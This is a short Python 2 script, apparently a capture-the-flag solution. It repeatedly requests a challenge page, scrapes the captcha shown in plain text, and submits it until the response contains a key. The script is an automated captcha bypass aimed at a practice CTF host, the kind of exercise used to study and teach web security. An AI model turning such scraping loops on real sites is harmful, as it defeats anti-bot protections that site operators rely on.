#!/usr/bin/env python

import requests
import sys

while True:
    src = requests.get('http://ctf.slothparadise.com/walled_garden.php?name=bob')
    sp = src.text.split('<pre>')[1]
    capt = sp.split('</pre>')[0]
    r = requests.get('http://ctf.slothparadise.com/walled_garden.php?name=bob&captcha=' + capt)
    if 'KEY' in r.text:
        print r.text
        sys.exit()
